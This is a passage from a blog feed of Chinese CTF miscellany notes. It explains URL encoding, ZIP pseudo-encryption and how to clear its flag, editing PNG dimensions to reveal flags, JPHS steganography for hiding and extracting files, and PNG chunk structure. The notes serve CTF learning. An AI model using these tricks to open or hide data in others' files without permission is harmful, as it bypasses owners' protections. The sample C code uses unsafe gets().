    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/%E4%BE%8B%E9%A2%98/"/>
    <url>/2026/01/19/MISC/%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8/%E4%BE%8B%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="2025浙江省省赛初赛"><a href="#2025浙江省省赛初赛" class="headerlink" title="2025浙江省省赛初赛"></a>2025浙江省省赛初赛</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E5%9F%BA%E7%A1%80/%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/"/>
    <url>/2026/01/19/MISC/%E5%9F%BA%E7%A1%80/%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h1><p><a href="https://blog.csdn.net/liuxl57805678/article/details/132335562">url中的特殊符号及特殊字符编码对照表_空字符url编码-CSDN博客</a></p><p><a href="https://www.w3school.com.cn/tags/html_ref_urlencode.asp">HTML URL 编码参考手册 (w3school.com.cn)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">有些符号在URL中是不能直接传递的，如果要在URL中传递这些特殊符号，那么就要使用他们的编码了。<br>编码的格式为：%加字符的ASCII码，即一个百分号%，后面跟对应字符的ASCII（16进制）码值。例如 空格的编码值是&quot;%20&quot;。<br>如果不使用转义字符，这些编码就会当URL中定义的特殊字符处理。<br>下表中列出了一些URL特殊符号及编码 十六进制值<br>1) + URL 中+号表示空格 %2B<br>2) 空格 URL中的空格可以用+号或者编码 %20<br>3) / 分隔目录和子目录 %2F<br>4) ? 分隔实际的 URL 和参数 %3F<br>5) % 指定特殊字符 %25<br>6) # 表示书签 %23<br>7) &amp;amp; URL 中指定的参数间的分隔符 %26<br>8) = URL 中指定参数的值 %3D<br></code></pre></td></tr></table></figure><blockquote><p>更新: 2024-07-30 14:40:49<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/ickn3z6r73ybmand">https://www.yuque.com/chaye-apqbl/vsc85q/ickn3z6r73ybmand</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E5%9F%BA%E7%A1%80/%E6%9D%82%E9%A1%B9%E6%80%BB%E7%BB%93/"/>
    <url>/2026/01/19/MISC/%E5%9F%BA%E7%A1%80/%E6%9D%82%E9%A1%B9%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="杂项总结"><a href="#杂项总结" class="headerlink" title="杂项总结"></a>杂项总结</h1><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="萌新题1"><a href="#萌新题1" class="headerlink" title="萌新题1"></a>萌新题1</h3><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715076716049-7e2771f9-ca09-40ea-8603-0d6a138ae21b-178881.png" alt="1715076716049-7e2771f9-ca09-40ea-8603-0d6a138ae21b.png">大写字母就是flag，写个简单脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> s[<span class="hljs-number">1000</span>]=&#123;<span class="hljs-string">&#x27;\0&#x27;</span>&#125;;<br>    gets(s);<br>    <span class="hljs-type">int</span> len=<span class="hljs-built_in">strlen</span>(s);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(s[i]&gt;=<span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; s[i]&lt;=<span class="hljs-string">&#x27;Z&#x27;</span>)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,s[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715076761369-298a4100-0f01-4b1d-ab66-e1d8851961f4-767259.png" alt="1715076761369-298a4100-0f01-4b1d-ab66-e1d8851961f4.png"></p><h1 id="ZIP伪加密解析"><a href="#ZIP伪加密解析" class="headerlink" title="ZIP伪加密解析"></a><font style="color:rgb(51, 51, 51);">ZIP伪加密解析</font></h1><h2 id="1、zip组成"><a href="#1、zip组成" class="headerlink" title="1、zip组成"></a><font style="color:rgb(51, 51, 51);">1、zip组成</font></h2><p><font style="color:rgb(51, 51, 51);">一个 ZIP 文件由三个部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志。</font></p><p><a href="https://blog.csdn.net/wclxyn/article/details/7288994"><font style="color:rgb(33, 37, 41);">一个zip文件由这样三个部分组成_zip 文件结构_一只独孤的程序猿的博客-CSDN博客</font></a></p><h2 id="2、实例"><a href="#2、实例" class="headerlink" title="2、实例"></a><font style="color:rgb(51, 51, 51);">2、实例</font></h2><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715080319355-6dcd924b-4078-4eb9-a5e9-76d4f3a22d16-463995.png" alt="1715080319355-6dcd924b-4078-4eb9-a5e9-76d4f3a22d16.png"></p><p><strong><font style="color:rgb(51, 51, 51);">压缩源文件数据区：</font></strong><font style="color:rgb(51, 51, 51);"><br></font><font style="color:rgb(51, 51, 51);">50 4B 03 04：这是头文件标记（0x04034b50）<br></font><font style="color:rgb(51, 51, 51);">14 00：解压文件所需 pkware 版本<br></font><font style="color:rgb(51, 51, 51);">00 00：全局方式位标记（有无加密）</font><font style="color:rgb(51, 51, 51);"> </font><strong><font style="color:rgb(51, 51, 51);">头文件标记后2bytes</font></strong><font style="color:rgb(51, 51, 51);"><br></font><strong><font style="color:rgb(51, 51, 51);">压缩源文件目录区：</font></strong></p><p><font style="color:rgb(51, 51, 51);">50 4B 01 02：目录中文件文件头标记(0x02014b50)</font></p><p><font style="color:rgb(51, 51, 51);">3F 00：压缩使用的 pkware 版本</font></p><p><font style="color:rgb(51, 51, 51);">14 00：解压文件所需 pkware 版本<br></font><font style="color:rgb(51, 51, 51);">00 00：全局方式位标记（有无加密，伪加密的关键）</font><font style="color:rgb(51, 51, 51);"> </font><strong><font style="color:rgb(51, 51, 51);">目录文件标记后4bytes</font></strong><font style="color:rgb(51, 51, 51);"><br></font><strong><font style="color:rgb(51, 51, 51);">压缩源文件目录结束标志：</font></strong><font style="color:rgb(51, 51, 51);"><br></font><font style="color:rgb(51, 51, 51);">50 4B 05 06：目录结束标记</font></p><h2 id="3、全局方式位标记"><a href="#3、全局方式位标记" class="headerlink" title="3、全局方式位标记"></a><font style="color:rgb(51, 51, 51);">3、全局方式位标记</font></h2><p><font style="color:rgb(51, 51, 51);">全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性！<br></font><strong><font style="color:rgb(51, 51, 51);">第二个数字为奇数时 –&gt;加密</font></strong><font style="color:rgb(51, 51, 51);"><br></font><strong><font style="color:rgb(51, 51, 51);">第二个数字为偶数时 –&gt;未加密</font></strong></p><h2 id="4、辨别zip是真加密还是伪加密"><a href="#4、辨别zip是真加密还是伪加密" class="headerlink" title="4、辨别zip是真加密还是伪加密"></a><font style="color:rgb(51, 51, 51);">4、辨别zip是真加密还是伪加密</font></h2><h3 id="1）无加密"><a href="#1）无加密" class="headerlink" title="1）无加密"></a><font style="color:rgb(51, 51, 51);">1）无加密</font></h3><p><font style="color:rgb(51, 51, 51);">压缩源文件数据区的全局加密应当为</font><font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);">00 00</font><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">（504B0304两个bytes之后）<br></font><font style="color:rgb(51, 51, 51);">且压缩源文件目录区的全局方式位标记应当为</font><font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);">00 00</font><font style="color:rgb(51, 51, 51);">（504B0304四个bytes之后）</font></p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715080319328-03d43b8d-5052-4baa-b2eb-195421aaf04c-080697.png" alt="1715080319328-03d43b8d-5052-4baa-b2eb-195421aaf04c.png"></p><h3 id="2）伪加密"><a href="#2）伪加密" class="headerlink" title="2）伪加密"></a><font style="color:rgb(51, 51, 51);">2）伪加密</font></h3><p><font style="color:rgb(51, 51, 51);">压缩源文件数据区的全局加密应当为</font><font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);">00 00</font><font style="color:rgb(51, 51, 51);"><br></font><font style="color:rgb(51, 51, 51);">且压缩源文件目录区的全局方式位标记应当为</font><font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);">09 00</font></p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715080319328-1e9272a7-c29d-4a5e-86d9-5b74ceb71adb-199725.png" alt="1715080319328-1e9272a7-c29d-4a5e-86d9-5b74ceb71adb.png"></p><h3 id="3）真加密"><a href="#3）真加密" class="headerlink" title="3）真加密"></a><font style="color:rgb(51, 51, 51);">3）真加密</font></h3><p><font style="color:rgb(51, 51, 51);">压缩源文件数据区的全局加密应当为</font><font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);">09 00</font><font style="color:rgb(51, 51, 51);"><br></font><font style="color:rgb(51, 51, 51);">且压缩源文件目录区的全局方式位标记应当为</font><font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);">09 00</font><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">!</font></p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715080319344-27b995e7-2657-4e8e-ac7a-8678c9e3f0fb-830660.png" alt="1715080319344-27b995e7-2657-4e8e-ac7a-8678c9e3f0fb.png"></p><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a><font style="color:rgb(33, 37, 41);">例题</font></h2><p><font style="color:rgb(33, 37, 41);">把压缩包拖到winhex里打利用WinHex搜索，快速定位到目录区头文件标记处开，50 4B 03 04，这是压缩源文件数据区头文件标记，50 4B 01 02，这是压缩源文件目录区头文件标记，以50为第一处，找到第9、10处数值位置，第9处数值如果是奇数就代表有密码，偶数代表无密码</font></p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715080159737-bf7beda1-57f9-4d7b-b94e-369cd0bab969-804414.png" alt="1715080159737-bf7beda1-57f9-4d7b-b94e-369cd0bab969.png"></p><p>第九位是偶数属于伪加密</p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715080259574-f206e589-159a-4f39-b5d5-eab6ba7198f2-395351.png" alt="1715080259574-f206e589-159a-4f39-b5d5-eab6ba7198f2.png"></p><p>把09 00 改成00 00保存后就能打开了</p><h1 id="010、winhex修改图片格式"><a href="#010、winhex修改图片格式" class="headerlink" title="010、winhex修改图片格式"></a>010、winhex修改图片格式</h1><p><font style="color:rgb(77, 77, 77);">从第二行开始，前四位是宽，后四位是高。</font></p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715080729487-4959214d-7808-42fe-81ca-89fa501f1255-656299.png" alt="1715080729487-4959214d-7808-42fe-81ca-89fa501f1255.png"></p><h2 id="例题1-修改高度"><a href="#例题1-修改高度" class="headerlink" title="例题1 修改高度"></a>例题1 修改高度</h2><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715081138945-05411f70-0c96-439a-942a-b85b886b4c58-148233.png" alt="1715081138945-05411f70-0c96-439a-942a-b85b886b4c58.png"></p><p>把后面的的01改成02就可以增加高度，改成00就减小高度</p><p>不知道为什么前面的宽度改不了，改了会变成乱码（将01改成02）</p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715081597458-73401b1b-a0a0-4296-ad59-46dee88c64ae-411427.png" alt="1715081597458-73401b1b-a0a0-4296-ad59-46dee88c64ae.png"></p><h2 id="例题2-修改宽度"><a href="#例题2-修改宽度" class="headerlink" title="例题2 修改宽度"></a>例题2 修改宽度</h2><p>将03改成02，下调一个度，就可以看到flag啦</p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715081659947-32ed728f-cd1c-4852-a3d3-040d983e483f-983767.png" alt="1715081659947-32ed728f-cd1c-4852-a3d3-040d983e483f.png"></p><h1 id="JPHS的使用"><a href="#JPHS的使用" class="headerlink" title="JPHS的使用"></a>JPHS的使用</h1><p>准备阶段：</p><p> 有windows和Linux版本的，windows版有可视化界面</p><p>windows可视化界面的下载地址：</p><p>Download for Free JPHS for Windows 0.5 (scanwith.com)</p><p>GitHub下载地址：</p><p>h3xx&#x2F;jphs: jphide &amp; seek steganography tools (github.com)</p><p>使用对象：</p><p>从名字不难看出使用对象是JPEG文件（就是常见的.jpg文件）</p><p>简介：JPEG是联合图象专家组(Joint Picture Expert Group)的英文缩写，是国际标准化组织(ISO)和CCITT联合制定的静态图象的压缩编码标准，比相同图象质量的其它文件格式（静态图象）相比压缩比最高的（高压缩比）</p><p>JPHS介绍：</p><p>对有损压缩JPEG文件进行信息的加密隐藏、探测提取的工具</p><p>JPHS包含2个功能（靠2个程序实现）：</p><p>JPHIDE：能够将信息文件加密隐藏到JPEG图像</p><p>JPSEEK：从用JPHIDE程序加密隐藏得到的JPEG图像中探测并提取到信息文件</p><p>隐藏文件：</p><p> 第一步：准备文件</p><p>(test.jpg文件)+（test.txt文本）</p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715082527848-11d91933-aacc-4aa3-96ec-5074f16bf28d-509357.png" alt="1715082527848-11d91933-aacc-4aa3-96ec-5074f16bf28d.png"></p><p>第二步：（windows版本） 打开软件，点击“Open jpeg”</p><p>使用图形化操作界面的Jphs（Windows版本）——-&gt;点击“Open jpeg”打开JPEG格式图片</p><p>（我这里打开的test.jpg）</p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715082538254-603d3adb-0722-4f01-a14c-2683ee60669c-805285.png" alt="1715082538254-603d3adb-0722-4f01-a14c-2683ee60669c.png"></p><p>打开之后有按钮就不是灰色的了</p><p>并且还会显示JPEG文件的相关信息</p><p>(注：如果打开的不是JPEG文件会自动退出)</p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715082552004-07a3c180-683a-4faa-bb84-290164ee0797-937598.png" alt="1715082552004-07a3c180-683a-4faa-bb84-290164ee0797.png"></p><p>第三步：点击“Hide”，并输入密码</p><p>点击“Hide”后输入2次相同的密码，并点击ok</p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715082564963-de35d817-833c-4db5-a0b5-4a70530a261e-695449.png" alt="1715082564963-de35d817-833c-4db5-a0b5-4a70530a261e.png"></p><p>然后选择要隐藏进去的文件</p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715082579844-11749991-5770-4311-90ae-3775379d3fe9-507394.png" alt="1715082579844-11749991-5770-4311-90ae-3775379d3fe9.png"></p><p> 选择之后会在第二个Hidden中显示相关信息</p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715082588509-45d8fd03-66d1-4777-ac9b-c87c2b6ceed1-408260.png" alt="1715082588509-45d8fd03-66d1-4777-ac9b-c87c2b6ceed1.png"></p><p>第三步：将他们合并，并另存为</p><p>点击“Save jpeg as”将图片另存为jpeg格式然后输入自己想输入的名字.jpg</p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715082607181-8db66ec8-3f7b-42b2-aa51-b46859510838-099887.png" alt="1715082607181-8db66ec8-3f7b-42b2-aa51-b46859510838.png"></p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715082633923-c9fa024e-d24b-4dbd-b3fb-e0e541719852-887810.png" alt="1715082633923-c9fa024e-d24b-4dbd-b3fb-e0e541719852.png"></p><p> the file you hid in this jpeg has caused statistically significant change and may be detectable</p><p>您在此JPEG中隐藏的文件导致统计上显着的变化，可能是可检测的</p><p>提取隐藏文件：</p><p> （注：对图片的隐写方式和密码都一无所知的时候，使用Stegdetect进行探测和破解）</p><p>我们这里知道，就可以直接提取吧<img src="/./img/49277317_Q5542BIfgUtALiTb/1715082644847-6542cc8d-ed0a-4663-b2c8-59ea29496671-644232.png" alt="1715082644847-6542cc8d-ed0a-4663-b2c8-59ea29496671.png"></p><p>显示出信息就是打开成功了</p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715082652439-5f0fecf2-3eec-4240-806e-ae1e54f70b12-365576.png" alt="1715082652439-5f0fecf2-3eec-4240-806e-ae1e54f70b12.png"></p><p>点击seek，再输入密码进行提取</p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715082685375-989806db-8a59-4ab6-9d67-867dcda5283a-376214.png" alt="1715082685375-989806db-8a59-4ab6-9d67-867dcda5283a.png"></p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715082692133-5a26e5ac-afe8-4814-bb34-cc62ab67c9f1-056413.png" alt="1715082692133-5a26e5ac-afe8-4814-bb34-cc62ab67c9f1.png"></p><p> 已经提取到了（和隐藏进去的进行对比，是一样的）</p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715082707161-b0d1b22a-6e8e-4e05-9ce1-87f5f332f5eb-671681.png" alt="1715082707161-b0d1b22a-6e8e-4e05-9ce1-87f5f332f5eb.png"></p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715082714951-c4ba2def-dea0-4768-9bf1-65a6ac81044e-758415.png" alt="1715082714951-c4ba2def-dea0-4768-9bf1-65a6ac81044e.png"></p><h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h2><p>获得一个jpg文件，打开然后保存为txt文件，再存为png文件</p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715083184886-15f6ff7e-feec-4719-b9de-7015742403f3-546256.png" alt="1715083184886-15f6ff7e-feec-4719-b9de-7015742403f3.png"></p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715083222397-7684b0f2-64c4-4305-8181-03fbf4363b53-153216.png" alt="1715083222397-7684b0f2-64c4-4305-8181-03fbf4363b53.png"></p><p><font style="color:#DF2A3F;">然后请看二维码解密部分</font></p><h1 id="PNG文件格式详解"><a href="#PNG文件格式详解" class="headerlink" title="PNG文件格式详解"></a><font style="color:rgb(34, 34, 38);">PNG文件格式详解</font></h1><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a><font style="color:rgb(79, 79, 79);">概述</font></h3><p><font style="color:rgb(77, 77, 77);">PNG是20世纪90年代中期开始开发的图像文件存储格式，其目的是替代GIF和</font><a href="https://so.csdn.net/so/search?q=TIFF&spm=1001.2101.3001.7020">TIFF</a><font style="color:rgb(77, 77, 77);">文件格式，同时增加一些GIF文件格式所不具备的特性。流式网络图形格式(Portable Network Graphic Format，PNG)名称来源于非官方的“PNG’s Not GIF”，是一种位图文件(bitmap file)存储格式，读成“ping”。PNG用来存储灰度图像时，灰度图像的深度可多到16位，存储彩色图像时，彩色图像的深度可多到48位，并且还可存储多到16位的α通道数据。PNG使用从LZ77派生的无损数据压缩算法。（说白了这就是一种方便的、适于网络传播的轻便图片文件格式）</font></p><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a><font style="color:rgb(79, 79, 79);">特性</font></h3><ol><li><font style="color:rgb(51, 51, 51);">使用调色板技术可支持256种颜色的彩色图像。（必须的）</font></li><li><font style="color:rgb(51, 51, 51);">流式读&#x2F;写性(streamability)：图像文件格式允许连续读出和写入图像数据。（因此适于网络传播）</font></li><li><font style="color:rgb(51, 51, 51);">逐次逼近显示(progressive display)：这种特性可使在通信链路上传输图像文件的同时就在终端上显示图像，把整个轮廓显示出来之后逐步显示图像的细节，也就是先用低分辨率显示图像，然后逐步提高它的分辨率。（类似马赛克逐渐消除的过程）</font></li><li><font style="color:rgb(51, 51, 51);">透明性(transparency)：这个性能可使图像中某些部分不显示出来，用来创建一些有特色的图像。</font></li><li><font style="color:rgb(51, 51, 51);">辅助信息(ancillary information)：这个特性可用来在图像文件中存储一些文本注释信息。（就是可以说一些废话）</font></li><li><font style="color:rgb(51, 51, 51);">独立于计算机软硬件环境。</font></li><li><font style="color:rgb(51, 51, 51);">使用无损压缩。（无损！）</font></li><li><font style="color:rgb(51, 51, 51);">可在一个文件中存储多幅图像。</font></li></ol><h3 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a><font style="color:rgb(79, 79, 79);">文件结构</font></h3><p><font style="color:rgb(77, 77, 77);">PNG图像格式文件由文件署名和数据块(chunk)组成。</font></p><h4 id="文件署名域"><a href="#文件署名域" class="headerlink" title="文件署名域"></a><font style="color:rgb(79, 79, 79);">文件署名域</font></h4><p><font style="color:rgb(77, 77, 77);">8字节的PNG文件署名域用来识别该文件是不是PNG文件。该域的值是：</font></p><table><thead><tr><th align="left"><strong><font style="color:rgb(79, 79, 79);">十进制数</font></strong></th><th align="left"><strong><font style="color:rgb(79, 79, 79);">十六进制数</font></strong></th></tr></thead><tbody><tr><td align="left"><font style="color:rgb(79, 79, 79);">137</font></td><td align="left"><font style="color:rgb(79, 79, 79);">89</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">80</font></td><td align="left"><font style="color:rgb(79, 79, 79);">50</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">78</font></td><td align="left"><font style="color:rgb(79, 79, 79);">4e</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">71</font></td><td align="left"><font style="color:rgb(79, 79, 79);">47</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">13</font></td><td align="left"><font style="color:rgb(79, 79, 79);">0d</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">10</font></td><td align="left"><font style="color:rgb(79, 79, 79);">0a</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">26</font></td><td align="left"><font style="color:rgb(79, 79, 79);">1a</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">10</font></td><td align="left"><font style="color:rgb(79, 79, 79);">0a</font></td></tr></tbody></table><p><font style="color:rgb(77, 77, 77);">这个文件署名就是在</font><a href="https://blog.mythsman.com/2015/12/01/1/">《利用文件头标志判断文件类型》</a><font style="color:rgb(77, 77, 77);">中提到的文件头标志了，很简单。</font></p><h4 id="数据块"><a href="#数据块" class="headerlink" title="数据块"></a><font style="color:rgb(79, 79, 79);">数据块</font></h4><p><font style="color:rgb(77, 77, 77);">这里有两种类型的数据块，一种是称为关键数据块(critical chunk)，就是必须要有的块；另一种叫做辅助数据块(ancillary chunks)。</font></p><p><font style="color:rgb(77, 77, 77);">每个数据块都由下表所示的的4个域组成。</font></p><table><thead><tr><th align="left"><strong><font style="color:rgb(79, 79, 79);">名称</font></strong></th><th align="left"><strong><font style="color:rgb(79, 79, 79);">字节数</font></strong></th><th align="left"><strong><font style="color:rgb(79, 79, 79);">说明</font></strong></th></tr></thead><tbody><tr><td align="left"><font style="color:rgb(79, 79, 79);">Length(长度)</font></td><td align="left"><font style="color:rgb(79, 79, 79);">4字节</font></td><td align="left"><font style="color:rgb(79, 79, 79);">指定数据块中数据域的长度，其长度不超过(231−1)(231−1)字节</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Chunk Type Code(数据块类型码)</font></td><td align="left"><font style="color:rgb(79, 79, 79);">4字节</font></td><td align="left"><font style="color:rgb(79, 79, 79);">数据块类型码由ASCII字母(A-Z和a-z)组成</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Chunk Data(数据块实际内容</font></td><td align="left"><font style="color:rgb(79, 79, 79);">可变长度</font></td><td align="left"><font style="color:rgb(79, 79, 79);">存储按照Chunk Type Code指定的数据</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">CRC(循环冗余检测</font></td><td align="left"><font style="color:rgb(79, 79, 79);">4字节</font></td><td align="left"><font style="color:rgb(79, 79, 79);">存储用来检测是否有错误的循环冗余码</font></td></tr></tbody></table><p><font style="color:rgb(77, 77, 77);">其中CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的，可以看做一种校验码。</font></p><h4 id="关键数据块"><a href="#关键数据块" class="headerlink" title="关键数据块"></a><font style="color:rgb(79, 79, 79);">关键数据块</font></h4><p><font style="color:rgb(77, 77, 77);">关键数据块中的4个标准数据块是：</font></p><p><font style="color:rgb(77, 77, 77);">(1) 文件头数据块IHDR(header chunk)：</font></p><p><font style="color:rgb(77, 77, 77);">它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</font></p><p><font style="color:rgb(77, 77, 77);">文件头数据块由13字节，组成结构如下：</font></p><table><thead><tr><th align="left"><strong><font style="color:rgb(79, 79, 79);">域的名称</font></strong></th><th align="left"><strong><font style="color:rgb(79, 79, 79);">字节数</font></strong></th><th align="left"><strong><font style="color:rgb(79, 79, 79);">说明</font></strong></th></tr></thead><tbody><tr><td align="left"><font style="color:rgb(79, 79, 79);">Width</font></td><td align="left"><font style="color:rgb(79, 79, 79);">4 bytes</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像宽度，以像素为单位</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Height</font></td><td align="left"><font style="color:rgb(79, 79, 79);">4 bytes</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像高度，以像素为单位</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Bit depth</font></td><td align="left"><font style="color:rgb(79, 79, 79);">1 byte</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像深度：索引彩色图像：1，2，4或8 ;灰度图像：1，2，4，8或16 ;真彩色图像：8或16</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">ColorType</font></td><td align="left"><font style="color:rgb(79, 79, 79);">1 byte</font></td><td align="left"><font style="color:rgb(79, 79, 79);">颜色类型：0：灰度图像, 1，2，4，8或16;2：真彩色图像，8或16;3：索引彩色图像，1，2，4或84：带α通道数据的灰度图像，8或16;6：带α通道数据的真彩色图像，8或16</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Compression method</font></td><td align="left"><font style="color:rgb(79, 79, 79);">1 byte</font></td><td align="left"><font style="color:rgb(79, 79, 79);">压缩方法(LZ77派生算法)</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Filter method</font></td><td align="left"><font style="color:rgb(79, 79, 79);">1 byte</font></td><td align="left"><font style="color:rgb(79, 79, 79);">滤波器方法</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Interlace method</font></td><td align="left"><font style="color:rgb(79, 79, 79);">1 byte</font></td><td align="left"><font style="color:rgb(79, 79, 79);">隔行扫描方法：0：非隔行扫描;1： Adam7(由Adam M. Costello开发的7遍隔行扫描方法)</font></td></tr></tbody></table><p><font style="color:rgb(77, 77, 77);">(2) 调色板数据块PLTE(palette chunk)：</font></p><p><font style="color:rgb(77, 77, 77);">它包含有与索引彩色图像((indexed-color image))相关的彩色变换数据，它仅与索引彩色图像有关，而且要放在图像数据块(image data chunk)之前。真彩色的PNG数据流也可以有调色板数据块，目的是便于非真彩色显示程序用它来量化图像数据，从而显示该图像。结构如下：</font></p><p><font style="color:rgb(77, 77, 77);">|颜色|字节|意义|<br></font><font style="color:rgb(77, 77, 77);">|Red|1 byte||0 &#x3D; 黑色, 255 &#x3D; 红|<br></font><font style="color:rgb(77, 77, 77);">|Green|1 byte||0 &#x3D; 黑色, 255 &#x3D; 绿色|<br></font><font style="color:rgb(77, 77, 77);">|Blue|1 byte||0 &#x3D; 黑色, 255 &#x3D; 蓝色|</font></p><p><font style="color:rgb(77, 77, 77);">PLTE数据块是定义图像的调色板信息，PLTE可以包含1~256个调色板信息，每一个调色板信息由3个字节组成，因此调色板数据块所包含的最大字节数为768，调色板的长度应该是3的倍数，否则，这将是一个非法的调色板。</font></p><p><font style="color:rgb(77, 77, 77);">对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4&#x3D;16），否则，这将导致PNG图像不合法。</font></p><p><font style="color:rgb(77, 77, 77);">(3) 图像数据块IDAT(image data chunk)：</font></p><p><font style="color:rgb(77, 77, 77);">它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</font></p><p><font style="color:rgb(77, 77, 77);">IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像。</font></p><p><font style="color:rgb(77, 77, 77);">(4) 图像结束数据IEND(image trailer chunk)：</font></p><p><font style="color:rgb(77, 77, 77);">它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</font></p><p><font style="color:rgb(77, 77, 